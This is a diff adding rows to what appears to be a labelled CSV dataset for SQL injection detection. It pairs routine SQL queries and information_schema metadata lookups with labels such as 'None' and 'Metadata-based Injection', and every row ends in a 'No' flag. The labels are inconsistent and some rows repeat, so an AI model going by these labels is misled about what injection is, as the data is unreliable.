+SELECT COUNT(*) FROM orders WHERE order_date BETWEEN '2024-01-01' AND '2024-12-31';,None,No
+DELETE FROM carts WHERE user_id = 2;,None,No
+SELECT * FROM categories WHERE is_featured = true;,None,No
+"SELECT user_id, SUM(amount) FROM payments GROUP BY user_id;",None,No
+"INSERT INTO feedback (user_id, product_id, comment) VALUES (3, 2, 'Loved it!');",None,No
+SELECT MIN(stock) FROM products WHERE category_id = 1;,None,No
+SELECT * FROM orders WHERE created_at < '2023-12-31';,None,No
+UPDATE inventory SET stock = stock + 5 WHERE product_id = 15;,None,No
+"SELECT * FROM users WHERE user_id IN (1, 2, 3);",None,No
+"SELECT * FROM invoices WHERE status IN ('pending', 'overdue');",None,No
+DELETE FROM logs WHERE log_date < NOW() - INTERVAL 1 YEAR;,None,No
+SELECT * FROM sessions WHERE created_at >= NOW() - INTERVAL 7 DAY;,None,No
+SELECT product_name FROM products WHERE price > 0 ORDER BY price DESC;,None,No
+SELECT * FROM employees WHERE first_name LIKE 'A%';,None,No
+"INSERT INTO transactions (user_id, amount, transaction_date) VALUES (3, 250.00, '2024-05-10');",None,No
+SELECT * FROM customers WHERE address LIKE '%Main St%';,None,No
+SELECT * FROM orders WHERE customer_id = 4 AND order_total > 50;,None,No
+SELECT COUNT(*) FROM products WHERE stock > 0;,None,No
+UPDATE accounts SET account_status = 'inactive' WHERE last_login < NOW() - INTERVAL 1 YEAR;,None,No
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';,Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'sales';,Metadata-based Injection,No
+SELECT * FROM information_schema.views WHERE table_schema = 'marketing';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'hr' AND table_type = 'BASE TABLE';,Metadata-based Injection,No
+SELECT data_type FROM information_schema.columns WHERE table_name = 'products';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_type = 'FUNCTION';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_name LIKE '%orders%';,Metadata-based Injection,No
+SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'employees';,Metadata-based Injection,No
+"SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public';",Metadata-based Injection,No
+SELECT * FROM information_schema.key_column_usage WHERE table_name = 'orders';,Metadata-based Injection,No
+"SELECT * FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'pg_catalog');",Metadata-based Injection,No
+SELECT * FROM information_schema.columns WHERE table_schema = 'inventory' AND column_name = 'stock';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_catalog = 'my_database';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_constraints WHERE table_name = 'users';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'VIEW';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_schema = 'public';,Metadata-based Injection,No
+SELECT * FROM information_schema.views WHERE table_schema = 'sales';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_constraints WHERE constraint_type = 'PRIMARY KEY';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_privileges WHERE grantee = 'my_user';,Metadata-based Injection,No
+"SELECT table_name FROM information_schema.tables WHERE table_schema IN ('public', 'information_schema');",Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_schema = 'sales' AND table_name = 'transactions';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.views WHERE table_schema = 'public';,Metadata-based Injection,No
+"SELECT table_catalog, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';",Metadata-based Injection,No
+SELECT * FROM information_schema.columns WHERE table_name = 'products' AND ordinal_position < 5;,Metadata-based Injection,No
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' ORDER BY table_name;,Metadata-based Injection,No
+SELECT * FROM information_schema.key_column_usage WHERE table_name = 'employees' AND table_schema = 'hr';,Metadata-based Injection,No
+SELECT COUNT(DISTINCT table_name) FROM information_schema.tables WHERE table_type = 'BASE TABLE';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE constraint_schema = 'public';,Metadata-based Injection,No
+SELECT * FROM information_schema.column_privileges WHERE table_name = 'users';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT LIKE 'temp_%';,Metadata-based Injection,No
+"SELECT * FROM information_schema.table_constraints WHERE table_name IN ('orders', 'customers');",Metadata-based Injection,No
+SELECT * FROM information_schema.columns WHERE table_name = 'products' AND column_name LIKE '%price%';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_type = 'PROCEDURE' AND specific_schema = 'public';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'VIEW';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_privileges WHERE grantee = 'app_user' AND table_name = 'payments';,Metadata-based Injection,No
+"SELECT * FROM information_schema.tables WHERE table_schema = 'inventory' AND table_name NOT IN ('items', 'suppliers');",Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_schema = 'public' AND routine_name LIKE 'get_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.columns WHERE table_schema = 'sales' AND is_nullable = 'NO';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_constraints WHERE constraint_type = 'FOREIGN KEY' AND table_name = 'orders';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE' ORDER BY table_name;,Metadata-based Injection,No
+"SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'employees' AND table_schema = 'hr';",Metadata-based Injection,No
+"SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema', 'pg_catalog') ORDER BY table_name;",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.key_column_usage WHERE table_name = 'orders' AND table_schema = 'public';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE constraint_name = 'fk_customer_id';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_catalog = 'my_database' AND table_schema = 'sales';,Metadata-based Injection,No
+"SELECT column_name, character_maximum_length FROM information_schema.columns WHERE table_name = 'products';",Metadata-based Injection,No
+SELECT * FROM information_schema.views WHERE table_schema = 'public' AND view_definition LIKE '%SELECT%';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_privileges WHERE table_schema = 'hr' AND privilege_type = 'SELECT';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_schema = 'public' AND data_type = 'void';,Metadata-based Injection,No
+SELECT * FROM information_schema.columns WHERE table_name = 'transactions' AND is_nullable = 'YES';,Metadata-based Injection,No
+"SELECT * FROM information_schema.tables WHERE table_name IN ('users', 'orders');",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'sales' AND table_type = 'VIEW';,Metadata-based Injection,No
+SELECT * FROM information_schema.key_column_usage WHERE table_name = 'products' AND column_name = 'product_id';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_name LIKE '%history%' AND table_schema = 'public';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_name = 'orders' AND constraint_schema = 'public';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_name LIKE 'proc_%';,Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_name = 'feedback' AND ordinal_position > 3;,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_constraints WHERE table_schema = 'inventory' AND constraint_type = 'PRIMARY KEY';,Metadata-based Injection,No
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' AND table_name LIKE 'user_%';,Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_schema = 'sales' AND table_name = 'invoices';,Metadata-based Injection,No
+"SELECT table_name, table_rows FROM information_schema.tables WHERE table_schema = 'public';",Metadata-based Injection,No
+SELECT * FROM information_schema.key_column_usage WHERE table_schema = 'hr' AND constraint_name LIKE 'pk_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_type = 'VIEW' AND table_schema = 'marketing';,Metadata-based Injection,No
+"SELECT column_name, is_nullable FROM information_schema.columns WHERE table_name = 'customers';",Metadata-based Injection,No
+SELECT * FROM information_schema.table_privileges WHERE table_schema = 'public' AND grantee = 'admin';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE constraint_type = 'UNIQUE';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT LIKE 'temp_%' ORDER BY table_name;,Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_schema = 'inventory' AND table_name = 'products';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'finance';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND specific_schema = 'public';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_constraints WHERE table_name = 'orders' AND constraint_type = 'FOREIGN KEY';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_catalog = 'my_database' AND table_type = 'BASE TABLE';,Metadata-based Injection,No
+"SELECT column_name, column_default FROM information_schema.columns WHERE table_name = 'users';",Metadata-based Injection,No
+SELECT * FROM information_schema.views WHERE table_name LIKE '%summary%';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.column_privileges WHERE privilege_type = 'SELECT';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'sales' AND table_name = 'transactions';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE constraint_schema = 'public';,Metadata-based Injection,No
+"SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT IN ('settings', 'logs');",Metadata-based Injection,No
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' AND table_rows > 10;,Metadata-based Injection,No
+"SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = 'sales' AND table_name = 'transactions';",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE' AND table_name NOT LIKE 'archive_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.key_column_usage WHERE table_schema = 'hr' AND referenced_table_name = 'departments';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'inventory' AND table_type = 'VIEW' AND table_name LIKE 'vw_%';,Metadata-based Injection,No
+"SELECT column_name, column_default, is_nullable FROM information_schema.columns WHERE table_name = 'customers';",Metadata-based Injection,No
+SELECT * FROM information_schema.table_privileges WHERE table_name = 'products' AND privilege_type = 'UPDATE';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_name = 'orders' AND constraint_name LIKE 'ck_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT LIKE 'temp_%' ORDER BY table_name DESC;,Metadata-based Injection,No
+"SELECT column_name, character_maximum_length FROM information_schema.columns WHERE table_name = 'employees' AND table_schema = 'hr';",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_name LIKE 'sales_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_schema = 'public' AND routine_name NOT LIKE 'proc_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_constraints WHERE table_schema = 'sales' AND constraint_type = 'PRIMARY KEY';,Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_schema = 'inventory' AND table_name = 'products' AND is_nullable = 'NO';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'hr' AND table_type = 'BASE TABLE';,Metadata-based Injection,No
+SELECT * FROM information_schema.views WHERE view_definition LIKE '%FROM%';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.column_privileges WHERE privilege_type = 'INSERT';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name LIKE 'user_%' AND table_type = 'BASE TABLE';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_name = 'products' AND constraint_schema = 'public';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'sales' AND table_name NOT LIKE 'archive_%';,Metadata-based Injection,No
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT LIKE 'old_%';,Metadata-based Injection,No
+"SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = 'sales' AND table_name IN ('orders', 'invoices');",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'VIEW';,Metadata-based Injection,No
+SELECT * FROM information_schema.key_column_usage WHERE table_schema = 'hr' AND table_name = 'employees';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'inventory' AND table_type = 'BASE TABLE' ORDER BY table_name ASC;,Metadata-based Injection,No
+"SELECT column_name, is_nullable FROM information_schema.columns WHERE table_name = 'transactions' AND table_schema = 'sales';",Metadata-based Injection,No
+"SELECT * FROM information_schema.table_privileges WHERE table_schema = 'public' AND table_name = 'users' AND privilege_type IN ('SELECT', 'INSERT');",Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_schema = 'public' AND constraint_type = 'CHECK';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name LIKE 'temp_%' ORDER BY table_name DESC;,Metadata-based Injection,No
+"SELECT column_name, ordinal_position FROM information_schema.columns WHERE table_schema = 'sales' AND table_name = 'invoices';",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE' AND table_name LIKE '%archive%';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_schema = 'public' AND routine_type = 'PROCEDURE';,Metadata-based Injection,No
+"SELECT * FROM information_schema.table_constraints WHERE table_name = 'customers' AND constraint_type IN ('PRIMARY KEY', 'FOREIGN KEY');",Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_schema = 'inventory' AND table_name = 'products' AND data_type = 'varchar';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'hr' AND table_name NOT LIKE 'old_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.views WHERE table_schema = 'public' AND view_definition LIKE '%SELECT%';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.column_privileges WHERE table_name = 'products' AND privilege_type = 'UPDATE';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'sales' AND table_name LIKE 'vw_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_name = 'orders' AND constraint_name NOT LIKE 'pk_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT LIKE '%temp%';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE' AND table_rows < 50;,Metadata-based Injection,No
+"SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = 'inventory' AND table_name = 'stock';",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_name LIKE 'log_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.key_column_usage WHERE table_name = 'purchases' AND table_schema = 'sales';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'admin' AND table_type = 'VIEW' ORDER BY table_name;,Metadata-based Injection,No
+"SELECT column_name, is_nullable FROM information_schema.columns WHERE table_name = 'clients' AND table_schema = 'public';",Metadata-based Injection,No
+SELECT * FROM information_schema.table_privileges WHERE table_schema = 'sales' AND table_name = 'transactions' AND privilege_type = 'DELETE';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_name = 'employees' AND constraint_name LIKE 'fk_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT LIKE 'temp_%' ORDER BY table_rows DESC;,Metadata-based Injection,No
+"SELECT column_name, character_maximum_length FROM information_schema.columns WHERE table_schema = 'hr' AND table_name = 'positions';",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'VIEW' AND table_name LIKE '%report%';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_schema = 'public' AND routine_type = 'FUNCTION' AND routine_name LIKE 'get_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_constraints WHERE table_schema = 'finance' AND constraint_type = 'UNIQUE';,Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_schema = 'inventory' AND table_name = 'items' AND data_type = 'int';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'sales' AND table_name NOT LIKE 'temp_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.views WHERE table_schema = 'public' AND view_definition LIKE '%JOIN%';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.column_privileges WHERE table_schema = 'public' AND privilege_type = 'UPDATE';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'hr' AND table_name LIKE 'employee_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_name = 'projects' AND constraint_type = 'FOREIGN KEY';,Metadata-based Injection,No
+"SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT IN ('settings', 'logs');",Metadata-based Injection,No
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT LIKE 'old_%' AND table_type = 'BASE TABLE';,Metadata-based Injection,No
+"SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = 'sales' AND table_name = 'sales_data';",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'admin' AND table_name LIKE 'temp_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.key_column_usage WHERE table_name = 'invoices' AND table_schema = 'sales';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'inventory' AND table_type = 'BASE TABLE' ORDER BY table_name ASC LIMIT 5;,Metadata-based Injection,No
+"SELECT column_name, is_nullable FROM information_schema.columns WHERE table_name = 'clients' AND table_schema = 'public';",Metadata-based Injection,No
+"SELECT * FROM information_schema.table_privileges WHERE table_schema = 'sales' AND table_name = 'products' AND privilege_type IN ('SELECT', 'UPDATE');",Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_name = 'employees' AND constraint_name NOT LIKE 'pk_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT LIKE 'old_%' ORDER BY table_rows DESC LIMIT 10;,Metadata-based Injection,No
+"SELECT column_name, character_maximum_length FROM information_schema.columns WHERE table_schema = 'hr' AND table_name = 'departments';",Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'VIEW' AND table_name LIKE '%summary%';,Metadata-based Injection,No
+SELECT * FROM information_schema.routines WHERE routine_schema = 'public' AND routine_type = 'FUNCTION' AND routine_name LIKE 'set_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.table_constraints WHERE table_schema = 'finance' AND constraint_type = 'CHECK';,Metadata-based Injection,No
+SELECT column_name FROM information_schema.columns WHERE table_schema = 'inventory' AND table_name = 'stock_items' AND data_type = 'decimal';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'sales' AND table_name NOT LIKE 'temp_%';,Metadata-based Injection,No
+SELECT * FROM information_schema.views WHERE table_schema = 'public' AND view_definition LIKE '%WHERE%';,Metadata-based Injection,No
+SELECT COUNT(*) FROM information_schema.column_privileges WHERE table_schema = 'public' AND privilege_type = 'DELETE';,Metadata-based Injection,No
+SELECT * FROM information_schema.tables WHERE table_schema = 'hr' AND table_name LIKE 'employee_%' AND table_type = 'BASE TABLE';,Metadata-based Injection,No
+SELECT * FROM information_schema.check_constraints WHERE table_name = 'projects' AND constraint_type = 'UNIQUE';,Metadata-based Injection,No
+"SELECT * FROM information_schema.tables WHERE table_schema = 'public' AND table_name NOT IN ('archive', 'log');",Metadata-based Injection,No
